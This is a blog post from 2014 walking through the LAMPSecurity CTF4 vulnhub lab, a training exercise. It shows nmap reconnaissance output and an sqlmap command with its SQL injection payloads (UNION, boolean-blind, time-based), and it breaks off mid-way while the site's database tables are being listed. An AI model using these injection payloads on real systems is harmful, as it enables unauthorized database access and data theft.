
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
<meta content="True" name="HandheldFriendly"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="" name="robots"/>
<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
<meta content="maggick" name="author"/>
<meta content="I start the LAMPSecurity CTF4 challenge of vulnhub available here. The goal is to get a root shell on the server. Discovery First of all we need to determine the IP address of the server. Since we launch it in a bridged virtual machine the local router got the IP …" name="description"/>
<meta content="challenge, security, vulnhub, boot2root" name="keywords"/>
<meta content="maggick's logs" property="og:site_name">
<meta content="LAMPSecurity: CTF4" property="og:title"/>
<meta content="I start the LAMPSecurity CTF4 challenge of vulnhub available here. The goal is to get a root shell on the server. Discovery First of all we need to determine the IP address of the server. Since we launch it in a bridged virtual machine the local router got the IP …" property="og:description"/>
<meta content="en_US" property="og:locale"/>
<meta content="../../2014/08/lampsecurity-ctf4.html" property="og:url"/>
<meta content="article" property="og:type"/>
<meta content="2014-08-29 00:00:00+02:00" property="article:published_time"/>
<meta content="" property="article:modified_time"/>
<meta content="../../author/maggick.html" property="article:author"/>
<meta content="security" property="article:section">
<meta content="challenge" property="article:tag"/>
<meta content="security" property="article:tag"/>
<meta content="vulnhub" property="article:tag"/>
<meta content="boot2root" property="article:tag"/>
<meta content="https://maggick.fr/media/image.png" property="og:image"/>
<title>maggick's logs – LAMPSecurity: CTF4</title>
</meta></meta></head>
<body>
<aside>
<div>
<a href="../../">
<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
</a>
<h1>
<a href="../../">maggick's logs</a>
</h1>
<p>Offensive security tales</p>
<nav>
<ul class="list">
<li>
<a href="../../pages/about.html" target="_self">
                About
              </a>
</li>
<li>
<a href="../../pages/links.html" target="_self">
                Links
              </a>
</li>
<li>
<a href="../../pages/notes.html" target="_self">
                Notes
              </a>
</li>
<li>
<a href="../../pages/tools.html" target="_self">
                Tools
              </a>
</li>
</ul>
</nav>
<ul class="social">
<li>
<a class="sc-github" href="https://github.com/maggick" target="_blank">
<i class="fa-brands fa-github"></i>
</a>
</li>
<li>
<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
<i class="fa-brands fa-twitter"></i>
</a>
</li>
<li>
<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
<i class="fa-brands fa-stack-overflow"></i>
</a>
</li>
<li>
<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
<i class="fa-solid fa-rss"></i>
</a>
</li>
<li>
<a class="sc-discord" href="maggick" target="_blank">
<i class="fa-brands fa-discord"></i>
</a>
</li>
</ul>
</div>
</aside>
<main>
<nav>
<a href="../../">Home</a>
<a href="/archives.html">Archives</a>
<a href="/categories.html">Categories</a>
<a href="/tags.html">Tags</a>
<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
</nav>
<article class="single">
<header>
<h1 id="lampsecurity-ctf4">LAMPSecurity: CTF4</h1>
<p>
      Posted on 29 Aug 2014 in <a href="../../category/security.html">security</a>

        • 4 min read
    </p>
</header>
<div>
<p>I start the LAMPSecurity CTF4 challenge of vulnhub
<a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/">available here</a>.
The goal is to get a root shell on the server.</p>
<h1>Discovery</h1>
<p>First of all we need to determine the IP address of the server.
Since we launch it in a bridged virtual machine the local router got the IP
address in the DHCP logs. We simply found the most recent one. For me it is
<code>192.168.1.56</code>.</p>
<h2>Nmap</h2>
<p>Let start with a simple nmap</p>
<div class="highlight"><pre><span></span><code><span class="err">#</span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">A</span><span class="w"> </span><span class="o">-</span><span class="nx">oA</span><span class="w"> </span><span class="nx">ctf4</span><span class="w"> </span><span class="m m-Double">192.168.1.56</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="m m-Double">6.47</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">initiated</span><span class="w"> </span><span class="nx">Thu</span><span class="w"> </span><span class="nx">Aug</span><span class="w"> </span><span class="mi">28</span><span class="w"> </span><span class="mi">18</span><span class="p">:</span><span class="mi">49</span><span class="p">:</span><span class="mi">49</span><span class="w"> </span><span class="mi">2014</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span><span class="nx">nmap</span><span class="w"> </span><span class="o">-</span><span class="nx">A</span><span class="w"> </span><span class="o">-</span><span class="nx">oA</span><span class="w"> </span><span class="nx">ctf4</span><span class="w"> </span><span class="m m-Double">192.168.1.56</span>
<span class="nx">Nmap</span><span class="w"> </span><span class="nx">scan</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="m m-Double">192.168.1.56</span>
<span class="nx">Host</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">up</span><span class="w"> </span><span class="p">(</span><span class="m m-Double">0.00058</span><span class="nx">s</span><span class="w"> </span><span class="nx">latency</span><span class="p">).</span>
<span class="nx">Not</span><span class="w"> </span><span class="nx">shown</span><span class="p">:</span><span class="w"> </span><span class="mi">996</span><span class="w"> </span><span class="nx">filtered</span><span class="w"> </span><span class="nx">ports</span>
<span class="nx">PORT</span><span class="w">    </span><span class="nx">STATE</span><span class="w">  </span><span class="nx">SERVICE</span><span class="w"> </span><span class="nx">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">   </span><span class="nx">ssh</span><span class="w">     </span><span class="nx">OpenSSH</span><span class="w"> </span><span class="m m-Double">4.3</span><span class="w"> </span><span class="p">(</span><span class="nx">protocol</span><span class="w"> </span><span class="m m-Double">2.0</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">ssh</span><span class="o">-</span><span class="nx">hostkey</span><span class="p">:</span>
<span class="o">|</span><span class="w">   </span><span class="mi">1024</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">4</span><span class="nx">a</span><span class="p">:</span><span class="mi">18</span><span class="p">:</span><span class="kt">f8</span><span class="p">:</span><span class="mi">97</span><span class="p">:</span><span class="nx">e0</span><span class="p">:</span><span class="mi">72</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="nx">b5</span><span class="p">:</span><span class="nx">a4</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">93</span><span class="p">:</span><span class="mi">3</span><span class="nx">d</span><span class="p">:</span><span class="nx">aa</span><span class="p">:</span><span class="mi">9</span><span class="nx">d</span><span class="p">:</span><span class="nx">ef</span><span class="w"> </span><span class="p">(</span><span class="nx">DSA</span><span class="p">)</span>
<span class="o">|</span><span class="nx">_</span><span class="w">  </span><span class="mi">2048</span><span class="w"> </span><span class="nx">e7</span><span class="p">:</span><span class="mi">70</span><span class="p">:</span><span class="nx">d3</span><span class="p">:</span><span class="mi">81</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="nx">b8</span><span class="p">:</span><span class="mi">6</span><span class="nx">e</span><span class="p">:</span><span class="nx">fd</span><span class="p">:</span><span class="mi">31</span><span class="p">:</span><span class="nx">ae</span><span class="p">:</span><span class="mi">0</span><span class="nx">e</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="nx">ea</span><span class="p">:</span><span class="mi">5</span><span class="nx">c</span><span class="p">:</span><span class="nx">b4</span><span class="w"> </span><span class="p">(</span><span class="nx">RSA</span><span class="p">)</span>
<span class="mi">25</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">   </span><span class="nx">smtp</span><span class="w">    </span><span class="nx">Sendmail</span><span class="w"> </span><span class="m m-Double">8.13.5</span><span class="o">/</span><span class="m m-Double">8.13.5</span>
<span class="o">|</span><span class="w"> </span><span class="nx">smtp</span><span class="o">-</span><span class="nx">commands</span><span class="p">:</span><span class="w"> </span><span class="nx">ctf4</span><span class="p">.</span><span class="nx">sas</span><span class="p">.</span><span class="nx">upenn</span><span class="p">.</span><span class="nx">edu</span><span class="w"> </span><span class="nx">Hello</span><span class="w"> </span><span class="p">[</span><span class="m m-Double">192.168.1.97</span><span class="p">],</span><span class="w"> </span><span class="nx">pleased</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">meet</span><span class="w"> </span><span class="nx">you</span><span class="p">,</span><span class="w"> </span><span class="nx">ENHANCEDSTATUSCODES</span><span class="p">,</span><span class="w"> </span><span class="nx">PIPELINING</span><span class="p">,</span><span class="w"> </span><span class="nx">EXPN</span><span class="p">,</span><span class="w"> </span><span class="nx">VERB</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="nx">BITMIME</span><span class="p">,</span><span class="w"> </span><span class="nx">SIZE</span><span class="p">,</span><span class="w"> </span><span class="nx">DSN</span><span class="p">,</span><span class="w"> </span><span class="nx">ETRN</span><span class="p">,</span><span class="w"> </span><span class="nx">DELIVERBY</span><span class="p">,</span><span class="w"> </span><span class="nx">HELP</span><span class="p">,</span>
<span class="o">|</span><span class="nx">_</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">sendmail</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="m m-Double">8.13.5</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">Topics</span><span class="p">:</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">HELO</span><span class="w"> </span><span class="nx">EHLO</span><span class="w"> </span><span class="nx">MAIL</span><span class="w"> </span><span class="nx">RCPT</span><span class="w"> </span><span class="nx">DATA</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">RSET</span><span class="w"> </span><span class="nx">NOOP</span><span class="w"> </span><span class="nx">QUIT</span><span class="w"> </span><span class="nx">HELP</span><span class="w"> </span><span class="nx">VRFY</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">EXPN</span><span class="w"> </span><span class="nx">VERB</span><span class="w"> </span><span class="nx">ETRN</span><span class="w"> </span><span class="nx">DSN</span><span class="w"> </span><span class="nx">AUTH</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">STARTTLS</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="nx">more</span><span class="w"> </span><span class="nx">info</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="s">"HELP &lt;topic&gt;"</span><span class="p">.</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">To</span><span class="w"> </span><span class="nx">report</span><span class="w"> </span><span class="nx">bugs</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">implementation</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">sendmail</span><span class="o">-</span><span class="nx">bugs</span><span class="err">@</span><span class="nx">sendmail</span><span class="p">.</span><span class="nx">org</span><span class="p">.</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="nx">local</span><span class="w"> </span><span class="nx">information</span><span class="w"> </span><span class="nx">send</span><span class="w"> </span><span class="nx">email</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">Postmaster</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">your</span><span class="w"> </span><span class="nx">site</span><span class="p">.</span><span class="w"> </span><span class="m m-Double">2.0.0</span><span class="w"> </span><span class="nx">End</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">HELP</span><span class="w"> </span><span class="nx">info</span>
<span class="mi">80</span><span class="o">/</span><span class="nx">tcp</span><span class="w">  </span><span class="nx">open</span><span class="w">   </span><span class="nx">http</span><span class="w">    </span><span class="nx">Apache</span><span class="w"> </span><span class="nx">httpd</span><span class="w"> </span><span class="m m-Double">2.2.0</span><span class="w"> </span><span class="p">((</span><span class="nx">Fedora</span><span class="p">))</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">methods</span><span class="p">:</span><span class="w"> </span><span class="nx">No</span><span class="w"> </span><span class="nx">Allow</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="nx">Public</span><span class="w"> </span><span class="nx">header</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nx">OPTIONS</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="p">(</span><span class="nx">status</span><span class="w"> </span><span class="nx">code</span><span class="w"> </span><span class="mi">200</span><span class="p">)</span>
<span class="o">|</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">robots</span><span class="p">.</span><span class="nx">txt</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="nx">disallowed</span><span class="w"> </span><span class="nx">entries</span>
<span class="o">|</span><span class="nx">_</span><span class="o">/</span><span class="nx">mail</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nx">restricted</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nx">conf</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nx">sql</span><span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nx">admin</span><span class="o">/</span>
<span class="o">|</span><span class="nx">_http</span><span class="o">-</span><span class="nx">title</span><span class="p">:</span><span class="w">  </span><span class="nx">Prof</span><span class="p">.</span><span class="w"> </span><span class="nx">Ehks</span>
<span class="mi">631</span><span class="o">/</span><span class="nx">tcp</span><span class="w"> </span><span class="nx">closed</span><span class="w"> </span><span class="nx">ipp</span>
<span class="nx">Aggressive</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">guesses</span><span class="p">:</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.16</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">2.6.21</span><span class="w"> </span><span class="p">(</span><span class="mi">98</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.13</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">2.6.32</span><span class="w"> </span><span class="p">(</span><span class="mi">96</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Control4</span><span class="w"> </span><span class="nx">HC</span><span class="o">-</span><span class="mi">300</span><span class="w"> </span><span class="nx">home</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="p">(</span><span class="mi">96</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Lantronix</span><span class="w"> </span><span class="nx">SLC</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="nx">terminal</span><span class="w"> </span><span class="nx">server</span><span class="w"> </span><span class="p">(</span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="mi">96</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">SNR</span><span class="w"> </span><span class="nx">SNR</span><span class="o">-</span><span class="nx">S2960</span><span class="w"> </span><span class="nx">switch</span><span class="w"> </span><span class="p">(</span><span class="mi">95</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">SonicWALL</span><span class="w"> </span><span class="nx">Aventail</span><span class="w"> </span><span class="nx">EX</span><span class="o">-</span><span class="mi">6000</span><span class="w"> </span><span class="nx">VPN</span><span class="w"> </span><span class="nx">appliance</span><span class="w"> </span><span class="p">(</span><span class="mi">94</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.8</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">2.6.30</span><span class="w"> </span><span class="p">(</span><span class="mi">94</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Dell</span><span class="w"> </span><span class="nx">iDRAC</span><span class="w"> </span><span class="mi">6</span><span class="w"> </span><span class="nx">remote</span><span class="w"> </span><span class="nx">access</span><span class="w"> </span><span class="nx">controller</span><span class="w"> </span><span class="p">(</span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="mi">94</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.9</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">2.6.18</span><span class="w"> </span><span class="p">(</span><span class="mi">94</span><span class="o">%</span><span class="p">),</span><span class="w"> </span><span class="nx">Linux</span><span class="w"> </span><span class="m m-Double">2.6.18</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="m m-Double">2.6.32</span><span class="w"> </span><span class="p">(</span><span class="mi">94</span><span class="o">%</span><span class="p">)</span>
<span class="nx">No</span><span class="w"> </span><span class="nx">exact</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">matches</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="p">(</span><span class="nx">test</span><span class="w"> </span><span class="nx">conditions</span><span class="w"> </span><span class="nx">non</span><span class="o">-</span><span class="nx">ideal</span><span class="p">)</span>
<span class="nx">Service</span><span class="w"> </span><span class="nx">Info</span><span class="p">:</span><span class="w"> </span><span class="nx">Host</span><span class="p">:</span><span class="w"> </span><span class="nx">ctf4</span><span class="p">.</span><span class="nx">sas</span><span class="p">.</span><span class="nx">upenn</span><span class="p">.</span><span class="nx">edu</span><span class="p">;</span><span class="w"> </span><span class="nx">OS</span><span class="p">:</span><span class="w"> </span><span class="nx">Unix</span>
</code></pre></div>
<p>We found a list of available services:</p>
<ul>
<li>a SSH service on port 22</li>
<li>a mail service on port 25</li>
<li>a web service on port 80, note that there is five disallowed entries in robots.txt</li>
<li>and a close CUPS service on port 631.</li>
</ul>
<h2>The website</h2>
<p>Let's take a look at the web site. It is a simple blog site with a XSS flaw on
the search engine.</p>
<p>The article are indexed with a GET parameter id. This parameter is vulnerable to
an SQL injection.</p>
<h1>Exploitation</h1>
<h2>Sqlmap</h2>
<p>We launch sqlmap:</p>
<div class="highlight"><pre><span></span><code><span class="n">#sqlmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">'http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6'</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">--</span><span class="n">tables</span>
<span class="w">  </span><span class="n">sqlmap</span><span class="w"> </span><span class="n">identified</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">injection</span><span class="w"> </span><span class="n">points</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">total</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">HTTP</span><span class="p">(</span><span class="n">s</span><span class="p">)</span><span class="w"> </span><span class="nl">requests</span><span class="p">:</span>
<span class="w">  </span><span class="o">---</span>
<span class="w">  </span><span class="nl">Place</span><span class="p">:</span><span class="w"> </span><span class="k">GET</span>
<span class="w">  </span><span class="k">Parameter</span><span class="err">:</span><span class="w"> </span><span class="n">id</span>
<span class="w">      </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
<span class="w">      </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="k">boolean</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="k">HAVING</span><span class="w"> </span><span class="n">clause</span>
<span class="w">      </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">page</span><span class="o">=</span><span class="n">blog</span><span class="o">&amp;</span><span class="n">title</span><span class="o">=</span><span class="n">Blog</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">6</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="mi">2396</span><span class="o">=</span><span class="mi">2396</span>

<span class="w">      </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span>
<span class="w">      </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="p">(</span><span class="k">NULL</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">columns</span>
<span class="w">      </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">page</span><span class="o">=</span><span class="n">blog</span><span class="o">&amp;</span><span class="n">title</span><span class="o">=</span><span class="n">Blog</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">6</span><span class="w"> </span><span class="ow">UNION</span><span class="w"> </span><span class="ow">ALL</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">NULL</span><span class="p">,</span><span class="nf">CONCAT</span><span class="p">(</span><span class="mh">0x7172756f71</span><span class="p">,</span><span class="mh">0x494c647a675a47595a55</span><span class="p">,</span><span class="mh">0x7178657471</span><span class="p">),</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="p">,</span><span class="k">NULL</span><span class="err">#</span>

<span class="w">      </span><span class="nl">Type</span><span class="p">:</span><span class="w"> </span><span class="ow">AND</span><span class="o">/</span><span class="ow">OR</span><span class="w"> </span><span class="nc">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
<span class="w">      </span><span class="nl">Title</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">5.0.11</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="nc">time</span><span class="o">-</span><span class="n">based</span><span class="w"> </span><span class="n">blind</span>
<span class="w">      </span><span class="nl">Payload</span><span class="p">:</span><span class="w"> </span><span class="n">page</span><span class="o">=</span><span class="n">blog</span><span class="o">&amp;</span><span class="n">title</span><span class="o">=</span><span class="n">Blog</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">6</span><span class="w"> </span><span class="ow">AND</span><span class="w"> </span><span class="n">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="w">  </span><span class="o">---</span>
<span class="w">  </span><span class="o">[</span><span class="n">19:44:24</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="n">DBMS</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">MySQL</span>
<span class="w">  </span><span class="n">web</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">operating</span><span class="w"> </span><span class="k">system</span><span class="err">:</span><span class="w"> </span><span class="n">Linux</span><span class="w"> </span><span class="n">Fedora</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="p">(</span><span class="n">Bordeaux</span><span class="p">)</span>
<span class="w">  </span><span class="n">web</span><span class="w"> </span><span class="n">application</span><span class="w"> </span><span class="nl">technology</span><span class="p">:</span><span class="w"> </span><span class="n">Apache</span><span class="w"> </span><span class="mf">2.2.0</span><span class="p">,</span><span class="w"> </span><span class="n">PHP</span><span class="w"> </span><span class="mf">5.1.2</span>
<span class="w">  </span><span class="n">back</span><span class="o">-</span><span class="k">end</span><span class="w"> </span><span class="nl">DBMS</span><span class="p">:</span><span class="w"> </span><span class="n">MySQL</span><span class="w"> </span><span class="mf">5.0.11</span>
<span class="w">  </span><span class="o">[</span><span class="n">19:44:24</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="k">database</span><span class="w"> </span><span class="k">names</span>
<span class="w">  </span><span class="o">[</span><span class="n">19:44:24</span><span class="o">]</span><span class="w"> </span><span class="o">[</span><span class="n">INFO</span><span class="o">]</span><span class="w"> </span><span class="n">fetching</span><span class="w"> </span><span class="n">tables</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nl">databases</span><span class="p">:</span><span class="w"> </span><span class="s1">'calendar, ehks, information_schema, mysql, roundcubemail, test'</span>
<span class="w">  </span><span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">calendar</span>
<span class="w">  </span><span class="o">[</span><span class="n">5 tables</span><span class="o">]</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">phpc_calendars</span><span class="w">                        </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">phpc_events</span><span class="w">                           </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">phpc_sequence</span><span class="w">                         </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">phpc_users</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">uid</span><span class="w">                                   </span><span class="o">|</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>

<span class="w">  </span><span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">roundcubemail</span>
<span class="w">  </span><span class="o">[</span><span class="n">6 tables</span><span class="o">]</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">session</span><span class="w">                               </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">cache</span><span class="w">                                 </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">contacts</span><span class="w">                              </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">identities</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">messages</span><span class="w">                              </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">users</span><span class="w">                                 </span><span class="o">|</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>

<span class="w">  </span><span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">ehks</span>
<span class="w">  </span><span class="o">[</span><span class="n">3 tables</span><span class="o">]</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="k">user</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">blog</span><span class="w">                                  </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">comment</span><span class="w">                               </span><span class="o">|</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>

<span class="w">  </span><span class="k">Database</span><span class="err">:</span><span class="w"> </span><span class="n">information_schema</span>
<span class="w">  </span><span class="o">[</span><span class="n">16 tables</span><span class="o">]</span>
<span class="w">  </span><span class="o">+---------------------------------------+</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">CHARACTER_SETS</span><span class="w">                        </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">COLLATIONS</span><span class="w">                            </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">COLLATION_CHARACTER_SET_APPLICABILITY</span><span class="w"> </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">COLUMNS</span><span class="w">                               </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">COLUMN_PRIVILEGES</span><span class="w">                     </span><span class="o">|</span>
<span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">KEY_COLUMN_USAGE</span><span class="w">                      </span><span class="o">|</span>
